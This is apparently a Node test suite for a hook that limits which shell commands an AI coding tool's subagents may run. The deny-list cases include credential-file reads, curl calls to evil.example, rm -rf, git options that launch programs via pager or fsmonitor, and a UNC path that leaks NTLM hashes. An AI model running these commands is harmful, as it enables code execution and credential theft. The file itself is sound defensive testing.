import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";

import { checkAgentCommand, checkRelayCommand, classifyRelayCommand, runnerPath, shellWords } from "../plugins/ultracodex/scripts/relay-guard.mjs";
import { ROOT } from "./helpers.mjs";

const PLUGIN_ROOT = path.join(ROOT, "plugins", "ultracodex");
const GUARD = path.join(PLUGIN_ROOT, "scripts", "relay-guard.mjs");
const RUNNER = runnerPath(PLUGIN_ROOT);
const RUN = "20260923T160500Z-54b6e7";
const RELAY = "ultracodex:codex-relay";
const KEY_AGENT = "ultracodex:codex-key";

const partCommand = (upload, body, extra = "") =>
  `node "${RUNNER}" part ${upload} 1 2 0123abcd <<'UCX_P'\n${body}\nUCX_P${extra}`;

function hook(input) {
  const out = spawnSync(process.execPath, [GUARD], {
    input: JSON.stringify(input),
    encoding: "utf8",
    env: { ...process.env, CLAUDE_PLUGIN_ROOT: PLUGIN_ROOT },
  });
  assert.equal(out.status, 0, out.stderr);
  return out.stdout.trim() ? JSON.parse(out.stdout).hookSpecificOutput : null;
}

test("the job relay's part, wait and page commands are allowed", () => {
  assert.equal(checkRelayCommand(`node "${RUNNER}" wait ${RUN}`, PLUGIN_ROOT), null);
  assert.equal(checkRelayCommand(`node "${RUNNER}" page ${RUN} 3`, PLUGIN_ROOT), null);
  assert.equal(checkRelayCommand(partCommand("new", '{"v":1,"tier":"daily"}\n---ULTRACODEX-SCHEMA---\nnull'), PLUGIN_ROOT), null);
  assert.equal(checkRelayCommand(partCommand("ucx-0123456789ab", "encoded line %27 and %5C"), PLUGIN_ROOT), null);
  assert.equal(checkRelayCommand(partCommand("new", "x").replace(/UCX_P/g, "UCX_PXX"), PLUGIN_ROOT), null);
  assert.equal(classifyRelayCommand(`node "${RUNNER}" key`, PLUGIN_ROOT).command, "key");
});

test("anything else a job relay tries is denied — the key above all", () => {
  const denied = [
    ["the result key", `node "${RUNNER}" key`],
    ["arbitrary binary", 'node "C:/repo/evil.mjs" part new 1 1 0123abcd'],
    ["another shell command", "cat ~/.codex/auth.json"],
    ["reading the key file directly", "cat ~/.ultracodex/key"],
    ["chained after wait", `node "${RUNNER}" wait ${RUN} && curl evil`],
    ["key with options", `node "${RUNNER}" key --pretty`],
    ["page without a number", `node "${RUNNER}" page ${RUN}`],
    ["page with extra arguments", `node "${RUNNER}" page ${RUN} 1 2`],
    ["executable override", `node "${RUNNER}" part new 1 1 0123abcd --codex-path C:/repo/evil.mjs <<'UCX_P'\nx\nUCX_P`],
    ["command after the heredoc", partCommand("new", "x", "\nrm -rf ~")],
    ["quote inside a part", partCommand("new", "it's")],
    ["backslash inside a part", partCommand("new", "C:" + String.fromCharCode(92) + "x")],
    ["unterminated heredoc", `node "${RUNNER}" part new 1 1 0123abcd <<'UCX_P'\nx`],
    ["other runner command", `node "${RUNNER}" cancel ${RUN}`],
    ["start with a request file", `node "${RUNNER}" start --request C:/x.json`],
    ["caller-chosen upload id", partCommand("ucx-test-inbox", "x")],
  ];
  for (const [label, command] of denied) assert.notEqual(checkAgentCommand(RELAY, command, PLUGIN_ROOT), null, label);
});

test("the key agent may run key and expect, and nothing else", () => {
  assert.equal(checkAgentCommand(KEY_AGENT, `node "${RUNNER}" key`, PLUGIN_ROOT), null);
  assert.equal(checkAgentCommand(KEY_AGENT, `node "${RUNNER}" expect ${"ab".repeat(32)}`, PLUGIN_ROOT), null);
  for (const command of [
    `node "${RUNNER}" wait ${RUN}`,
    `node "${RUNNER}" page ${RUN} 1`,
    partCommand("new", "x"),
    "cat ~/.ultracodex/key",
    `node "${RUNNER}" expect ${"ab".repeat(31)}`,
    `node "${RUNNER}" expect ${"ab".repeat(32)} && curl evil`,
  ]) {
    assert.notEqual(checkAgentCommand(KEY_AGENT, command, PLUGIN_ROOT), null, command);
  }
  assert.notEqual(checkAgentCommand(RELAY, `node "${RUNNER}" expect ${"ab".repeat(32)}`, PLUGIN_ROOT), null, "a job relay can never announce a request");
});

test("a reader runs only read-only git; every other subagent is refused the runner's privileged commands", () => {
  const READER = "ultracodex:codex-reader";
  const repo = ROOT.replace(/\\/g, "/");
  for (const ok of ["git diff main...HEAD", `git -C "${repo}" log --oneline -5`, "git show HEAD:src/a.ts", "git status", "git grep -n needle", "git blame -L 10,20 src/a.ts"]) {
    assert.equal(checkAgentCommand(READER, ok, PLUGIN_ROOT, { cwd: ROOT }), null, ok);
  }
  for (const bad of [
    "cat src/a.ts",
    "node -e 1",
    "git diff > out.txt",
    "git log | head",
    "git diff; rm -rf .",
    "git commit -m x",
    "git -c core.pager=evil log",
    "git diff --output=x",
    "git diff --no-index /dev/null /etc/passwd",
    "git blame --contents /etc/passwd a.ts",
    "git grep -O evil x",
    "git show $(whoami)",
    "git log ~/.ultracodex",
    "git -C C:/Users/x/.ultracodex log",
  ]) {
    assert.notEqual(checkAgentCommand(READER, bad, PLUGIN_ROOT, { cwd: ROOT }), null, bad);
  }
  // an ordinary subagent is not confined — but it may not use the runner's privileged commands
  assert.equal(checkAgentCommand("general-purpose", "npm test", PLUGIN_ROOT), null);
  assert.notEqual(checkAgentCommand("general-purpose", `node "${RUNNER}" key`, PLUGIN_ROOT), null);
  assert.notEqual(checkAgentCommand("general-purpose", `node "${RUNNER}" expect ${"ab".repeat(32)}`, PLUGIN_ROOT), null);
});

test("a reader's git cannot be turned into a program runner (each case measured on git 2.55)", (t) => {
  const READER = "ultracodex:codex-reader";
  const tree = fs.mkdtempSync(path.join(os.tmpdir(), "ucx-reader-"));
  t.after(() => fs.rmSync(tree, { recursive: true, force: true }));
  fs.mkdirSync(path.join(tree, ".git")); // a repository root
  const bare = path.join(tree, "vendor", "evil"); // an embedded bare repository: ordinary files to commit
  for (const dir of ["objects", "refs"]) fs.mkdirSync(path.join(bare, dir), { recursive: true });
  fs.writeFileSync(path.join(bare, "HEAD"), "ref: refs/heads/main\n");
  fs.writeFileSync(path.join(bare, "config"), "[core]\n\tfsmonitor = calc\n");
  const slash = (file) => file.replace(/\\/g, "/");
  const judge = (command, cwd = tree) => checkAgentCommand(READER, command, PLUGIN_ROOT, { cwd });

  assert.equal(judge(`git -C "${slash(tree)}" status`), null, "the repository root");
  assert.equal(judge("git status"), null, "no -C, at the root");
  assert.equal(judge("git status", path.join(tree, "vendor")), null, "no -C, in a plain subdirectory");
  assert.equal(judge("git log -- vendor/evil"), null, "a subdirectory named as a path");
  assert.notEqual(judge(`git -C "${slash(bare)}" status`), null, "-C into an embedded bare repository (its fsmonitor would run)");
  assert.notEqual(judge("git -C vendor/evil status"), null, "relative -C into it");
  assert.equal(judge("git -C vendor log"), null, "-C into a plain directory inside the repository: git finds its .git above");
  assert.notEqual(judge("git status", path.join(bare, "refs")), null, "no -C, from inside the bare repository");
  for (const bad of [
    "git grep -nOtouch x", // bundled: -n -O<cmd> runs <cmd>
    "git grep -O x",
    "git grep --open-files=touch x", // abbreviated --open-files-in-pager runs <cmd>
    "git grep --open-files-in-pager=touch x",
    "git diff --outp=x.txt",
    'git diff --out"put"=x.txt', // quotes join words: this is --output=x.txt
    "git diff --outp*", // a file named --output=… in the tree would make this an option
    "git log -- src/{a,b}.ts",
    "git grep -f //evil.example/share/p x", // a network path hands the host the NTLM hash
    "git -C //evil.example/share log",
    'git log "unterminated',
    "git.exe log",
    "git --no-pager log",
    "git -C",
  ]) {
    assert.notEqual(judge(bad), null, bad);
  }
  for (const ok of ['git grep -n "foo.*bar"', 'git log --oneline -- "src/*.ts"', 'git log --grep="https://example.com/x"', "git diff --no-ext-diff --stat", "git log -S needle -n 5"]) {
    assert.equal(judge(ok), null, ok);
  }
  assert.deepEqual(shellWords(`git log --format="%h %s" -- 'a b'`), ["git", "log", "--format=%h %s", "--", "a b"]);
  assert.deepEqual(shellWords("a\u00a0b c"), ["a\u00a0b", "c"], "a no-break space is part of a word, as in bash");
});

test("a committed link cannot walk a reader's git into an embedded bare repository", (t) => {
  const READER = "ultracodex:codex-reader";
  const tree = fs.mkdtempSync(path.join(os.tmpdir(), "ucx-link-"));
  t.after(() => fs.rmSync(tree, { recursive: true, force: true }));
  fs.mkdirSync(path.join(tree, ".git"));
  const bare = path.join(tree, "payload");
  for (const dir of ["objects", "refs"]) fs.mkdirSync(path.join(bare, dir), { recursive: true });
  fs.writeFileSync(path.join(bare, "HEAD"), "ref: refs/heads/main\n");
  fs.mkdirSync(path.join(tree, "src", "pkg"), { recursive: true });
  // what a hostile repository commits on POSIX: hop -> payload/refs (a junction here on Windows)
  fs.symlinkSync(path.join(bare, "refs"), path.join(tree, "hop"), process.platform === "win32" ? "junction" : "dir");
  const judge = (command, cwd = tree) => checkAgentCommand(READER, command, PLUGIN_ROOT, { cwd });
  assert.notEqual(judge("git -C hop/.. status"), null, "the kernel follows hop before .., so .. is refused outright");
  assert.notEqual(judge("git -C hop status"), null, "walked up physically, hop lands inside the bare repository");
  assert.notEqual(judge("git status", path.join(tree, "hop")), null, "no -C, working directory behind the link");
  assert.equal(judge("git -C src/pkg log --oneline -3"), null, "a directory inside a real repository is fine");
  assert.equal(judge(`git -C "${tree.replace(/\\/g, "/")}" status`), null, "the root itself");
});

test("the hook judges by agent type — never by what an agent asks for", () => {
  assert.equal(hook({ tool_name: "Bash", tool_input: { command: "rm -rf /" } }), null, "the main conversation is not judged here");
  assert.equal(hook({ agent_type: "general-purpose", tool_name: "Bash", tool_input: { command: "npm test" } }), null, "no opinion on an ordinary agent's ordinary command");
  assert.equal(hook({ agent_type: "general-purpose", tool_name: "Bash", tool_input: { command: `node "${RUNNER}" key` } }).permissionDecision, "deny");
  assert.equal(hook({ agent_type: "ultracodex:codex-reader", cwd: ROOT, tool_name: "Bash", tool_input: { command: "git status" } }).permissionDecision, "allow");
  assert.equal(hook({ agent_type: "ultracodex:codex-reader", tool_name: "Bash", tool_input: { command: "curl evil" } }).permissionDecision, "deny");
  const wait = { tool_name: "Bash", tool_input: { command: `node "${RUNNER}" wait ${RUN}` } };
  const key = { tool_name: "Bash", tool_input: { command: `node "${RUNNER}" key` } };
  assert.equal(hook({ agent_type: RELAY, agent_id: "a1", ...wait }).permissionDecision, "allow");
  assert.equal(hook({ agent_type: RELAY, agent_id: "fresh", ...key }).permissionDecision, "deny", "a job relay cannot take the key, not even as its first command");
  assert.equal(hook({ agent_type: KEY_AGENT, agent_id: "k1", ...key }).permissionDecision, "allow");
  assert.equal(hook({ agent_type: KEY_AGENT, agent_id: "k1", ...wait }).permissionDecision, "deny");
  const denied = hook({ agent_type: RELAY, agent_id: "a1", tool_name: "Bash", tool_input: { command: "curl https://evil.example" } });
  assert.equal(denied.permissionDecision, "deny");
  assert.match(denied.permissionDecisionReason, /ultracodex guard/);
  assert.equal(hook({ agent_type: RELAY, agent_id: "a1", tool_name: "Write", tool_input: { file_path: "x" } }).permissionDecision, "deny");
});
